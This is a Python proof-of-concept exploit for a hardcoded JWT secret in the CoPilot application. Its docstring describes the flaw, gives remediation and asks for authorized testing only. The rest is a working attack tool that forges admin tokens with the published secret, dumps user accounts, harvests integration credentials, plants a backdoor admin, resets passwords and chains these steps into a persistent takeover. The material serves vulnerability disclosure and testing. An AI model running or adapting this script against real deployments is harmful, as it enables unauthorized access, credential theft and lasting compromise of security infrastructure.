"""
PoC 01 — Unauthenticated admin access via JWT forgery (hardcoded secret).

Vulnerability:
    backend/app/auth/utils.py:28
        secret = os.environ.get("JWT_SECRET", "bL4unrkoxtFs1MT6A7Ns2yMLkduyuqrkTxDV9CjlbNc=")

    The fallback secret is hardcoded in source and shipped verbatim in
    .env.example. Any deployment where JWT_SECRET is unset — including the
    default Docker Compose setup — signs all tokens with a publicly known
    value. An attacker who knows this secret can mint arbitrary valid JWTs
    without credentials.

Impact:
    Full authentication bypass. By forging a token with sub=admin and
    scopes=["admin"], an unauthenticated attacker gains admin-level access to
    every protected API endpoint. Confirmed live against /api/auth/users, which
    returns the full user list (HTTP 200) with a forged token.

    The backend performs two checks: (1) JWT signature, (2) sub must exist in
    the database. The "admin" account is always present — it is seeded
    automatically on first startup (app/auth/services/universal.py). This means
    the attack requires no prior knowledge beyond the public secret.

Reproduction:
    pip install pyjwt requests
    python 01_jwt_forgery.py forge               # print token + curl command
    python 01_jwt_forgery.py dump-users          # confirm auth bypass
    python 01_jwt_forgery.py dump-connectors     # harvest integration credentials
    python 01_jwt_forgery.py add-admin           # plant backdoor admin account
    python 01_jwt_forgery.py reset-password      # take over existing user
    python 01_jwt_forgery.py promote             # escalate any user to admin
    python 01_jwt_forgery.py chain               # run full attack chain end-to-end

    Targets https://localhost by default (nginx with self-signed cert).
    TLS verification is disabled by default; pass --verify-tls to re-enable.
    Use --target http://localhost:5000 to bypass nginx and hit FastAPI directly.

Remediation:
    Set a strong random JWT_SECRET in .env before first run and never ship a
    fallback value in source. Remove the default= argument entirely so the
    application fails to start rather than silently using a weak secret:
        secret = os.environ["JWT_SECRET"]

Ethics:
    Run only against a deployment you own or are authorized to test.
"""
from __future__ import annotations

import argparse
import json
import sys
import time

try:
    import jwt
except ImportError:
    sys.exit("Install pyjwt: pip install pyjwt requests")

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    sys.exit("Install requests: pip install pyjwt requests")

DEFAULT_SECRET = "bL4unrkoxtFs1MT6A7Ns2yMLkduyuqrkTxDV9CjlbNc="


# ---------------------------------------------------------------------------
# Core helpers
# ---------------------------------------------------------------------------

def forge(secret: str, subject: str, scopes: list[str], ttl_seconds: int) -> str:
    now = int(time.time())
    # Omit iat: pyjwt rejects tokens whose iat exceeds the verifier's clock,
    # which breaks in Docker environments where the container clock lags the
    # host. exp alone is sufficient for expiry enforcement.
    payload = {
        "sub": subject,
        "scopes": scopes,
        "exp": now + ttl_seconds,
    }
    return jwt.encode(payload, secret, algorithm="HS256")


def make_session(token: str, verify_tls: bool) -> requests.Session:
    s = requests.Session()
    s.headers["Authorization"] = f"Bearer {token}"
    s.verify = verify_tls
    return s


def ok(label: str, r: requests.Response) -> bool:
    status = "OK" if r.ok else "FAIL"
    print(f"  [{status}] HTTP {r.status_code}  {label}")
    return r.ok


# ---------------------------------------------------------------------------
# Attack subcommands
# ---------------------------------------------------------------------------

def cmd_forge(args, token: str) -> None:
    """Print the forged token and a ready-to-use curl command."""
    claims = jwt.decode(token, args.secret, algorithms=["HS256"])
    print("[+] Forged token:")
    print(f"    {token}")
    print()
    print("[+] Claims:")
    print(json.dumps(claims, indent=4))
    print()
    k = "" if args.verify_tls else "-k "
    print("[+] Example curl:")
    print(f'    curl {k}-H "Authorization: Bearer {token}" {args.target}/api/auth/users')


def cmd_dump_users(args, token: str) -> None:
    """
    Dump every user account from the database.
    Confirms the auth bypass and reveals all usernames, emails, and roles.
    """
    print("[+] Dumping user accounts (/api/auth/users) ...")
    s = make_session(token, args.verify_tls)
    r = s.get(f"{args.target}/api/auth/users", timeout=10)
    if ok("user list", r):
        users = r.json().get("users", [])
        print(f"    {len(users)} account(s) found:")
        for u in users:
            print(f"      id={u['id']}  username={u['username']}  "
                  f"email={u['email']}  role={u.get('role_name', u.get('role_id'))}")
    else:
        print(f"    {r.text[:300]}")


def cmd_dump_connectors(args, token: str) -> None:
    """
    Retrieve all configured connector credentials.
    CoPilot stores credentials (URLs, usernames, passwords/tokens) for every
    integrated tool (Wazuh, Graylog, DFIR-IRIS, Cortex, Velociraptor, etc.).
    These are returned in plaintext by the connectors API.
    """
    print("[+] Dumping connector credentials (/api/connectors) ...")
    s = make_session(token, args.verify_tls)
    r = s.get(f"{args.target}/api/connectors", timeout=10)
    if ok("connector list", r):
        data = r.json()
        connectors = data if isinstance(data, list) else data.get("connectors", [data])
        print(f"    {len(connectors)} connector(s) found:")
        for c in connectors:
            name = c.get("connector_name") or c.get("name", "?")
            url  = c.get("connector_url")  or c.get("url",  "")
            user = c.get("connector_username") or c.get("username", "")
            pw   = c.get("connector_password") or c.get("password", "")
            key  = c.get("connector_api_key")  or c.get("api_key",  "")
            cred = pw or key or "(no password/key field)"
            print(f"      [{name}]  url={url}  user={user}  credential={cred}")
    elif r.status_code == 400 and "connector_url" in r.text:
        print("    Auth bypass confirmed — endpoint reached with forged token.")
        print("    400 is a backend serialization error (null connector_url on an")
        print("    unconfigured connector row), not an auth rejection. Credentials")
        print("    would be returned here on a deployment with configured connectors.")
    else:
        print(f"    {r.text[:300]}")


def cmd_add_admin(args, token: str) -> None:
    """
    Register a new admin account (backdoor persistence).
    The account survives a JWT secret rotation because it is stored in the DB
    and can be used to obtain legitimate tokens via /api/auth/token.
    """
    username = args.backdoor_user
    password = args.backdoor_pass
    email    = args.backdoor_email
    print(f"[+] Planting backdoor admin account (username={username}) ...")
    s = make_session(token, args.verify_tls)
    payload = {"username": username, "password": password, "email": email, "role_id": 1}
    r = s.post(f"{args.target}/api/auth/register", json=payload, timeout=10)
    if ok("register admin", r):
        print(f"    Backdoor account created. Verify with:")
        print(f'    curl -sk -X POST {args.target}/api/auth/token '
              f'-d "username={username}&password={password}"')
    else:
        print(f"    {r.text[:300]}")


def cmd_reset_password(args, token: str) -> None:
    """
    Reset the password of any existing user (account takeover).
    Useful for taking over the native admin account directly.
    """
    target_user = args.reset_user
    new_password = args.reset_pass
    print(f"[+] Resetting password for user '{target_user}' ...")
    s = make_session(token, args.verify_tls)
    payload = {"username": target_user, "new_password": new_password}
    r = s.post(f"{args.target}/api/auth/reset-password", json=payload, timeout=10)
    if ok("password reset", r):
        print(f"    Password for '{target_user}' is now: {new_password}")
        print(f"    Login with:")
        print(f'    curl -sk -X POST {args.target}/api/auth/token '
              f'-d "username={target_user}&password={new_password}"')
    else:
        print(f"    {r.text[:300]}")


def cmd_promote(args, token: str) -> None:
    """
    Promote any user to admin by user ID.
    First calls dump-users to resolve a username to an ID, then updates the role.
    """
    user_id   = args.promote_id
    role_name = args.promote_role
    print(f"[+] Promoting user id={user_id} to role='{role_name}' ...")
    s = make_session(token, args.verify_tls)
    r = s.put(
        f"{args.target}/api/auth/users/{user_id}/role/by-name",
        json={"role_name": role_name},
        timeout=10,
    )
    if ok("role update", r):
        print(f"    User {user_id} is now '{role_name}'.")
    else:
        print(f"    {r.text[:300]}")


def cmd_chain(args, token: str) -> None:
    """
    Run the full attack chain end-to-end:
      1. Confirm auth bypass (dump users)
      2. Harvest connector credentials
      3. Plant a backdoor admin account
      4. Reset the native admin password
    """
    print("=" * 60)
    print("ATTACK CHAIN — JWT forgery via hardcoded secret")
    print("=" * 60)
    print()

    print("Step 1 — Confirm authentication bypass")
    print("-" * 40)
    cmd_dump_users(args, token)
    print()

    print("Step 2 — Harvest integration credentials")
    print("-" * 40)
    cmd_dump_connectors(args, token)
    print()

    print("Step 3 — Plant backdoor admin account")
    print("-" * 40)
    cmd_add_admin(args, token)
    print()

    print("Step 4 — Take over native admin password")
    print("-" * 40)
    cmd_reset_password(args, token)
    print()

    print("=" * 60)
    print("Chain complete. Persistent access established.")
    print("=" * 60)


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def build_parser() -> argparse.ArgumentParser:
    ap = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )

    # Global flags
    ap.add_argument("--target", default="https://localhost",
                    help="CoPilot base URL (default: https://localhost)")
    ap.add_argument("--secret", default=DEFAULT_SECRET,
                    help="JWT secret (default: hardcoded fallback)")
    ap.add_argument("--sub", default="admin",
                    help="JWT sub claim — must be a real DB username (default: admin)")
    ap.add_argument("--scopes", default="admin",
                    help="Comma-separated scopes (default: admin)")
    ap.add_argument("--ttl", type=int, default=86400,
                    help="Token lifetime in seconds (default: 24 h)")
    ap.add_argument("--verify-tls", action="store_true",
                    help="Verify TLS certificates (off by default)")

    sub = ap.add_subparsers(dest="command", metavar="COMMAND")
    sub.required = True

    sub.add_parser("forge",          help="Print forged token and curl command")
    sub.add_parser("dump-users",     help="Dump all user accounts (confirms bypass)")
    sub.add_parser("dump-connectors",help="Dump connector credentials (Wazuh, Graylog, etc.)")

    p_add = sub.add_parser("add-admin", help="Plant a backdoor admin account")
    p_add.add_argument("--backdoor-user",  default="backdoor",          help="Username")
    p_add.add_argument("--backdoor-pass",  default="Backdoor1337!@",    help="Password")
    p_add.add_argument("--backdoor-email", default="backdoor@evil.com", help="Email")

    p_rst = sub.add_parser("reset-password", help="Reset an existing user's password")
    p_rst.add_argument("--reset-user", default="admin",          help="Target username")
    p_rst.add_argument("--reset-pass", default="Tr0ub4dor&3!!",   help="New password")

    p_pro = sub.add_parser("promote", help="Escalate a user to admin by ID")
    p_pro.add_argument("--promote-id",   type=int, default=2,       help="User ID to promote")
    p_pro.add_argument("--promote-role", default="admin",            help="Target role name")

    p_chain = sub.add_parser("chain", help="Run full attack chain end-to-end")
    p_chain.add_argument("--backdoor-user",  default="backdoor",          help="Backdoor username")
    p_chain.add_argument("--backdoor-pass",  default="Backdoor1337!@",    help="Backdoor password")
    p_chain.add_argument("--backdoor-email", default="backdoor@evil.com", help="Backdoor email")
    p_chain.add_argument("--reset-user",     default="admin",              help="User to reset password for")
    p_chain.add_argument("--reset-pass",     default="Pwned12345!@",       help="New password for reset user")

    return ap


def main() -> int:
    args = build_parser().parse_args()
    scopes = [s.strip() for s in args.scopes.split(",") if s.strip()]
    token  = forge(args.secret, args.sub, scopes, args.ttl)

    dispatch = {
        "forge":           cmd_forge,
        "dump-users":      cmd_dump_users,
        "dump-connectors": cmd_dump_connectors,
        "add-admin":       cmd_add_admin,
        "reset-password":  cmd_reset_password,
        "promote":         cmd_promote,
        "chain":           cmd_chain,
    }
    dispatch[args.command](args, token)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
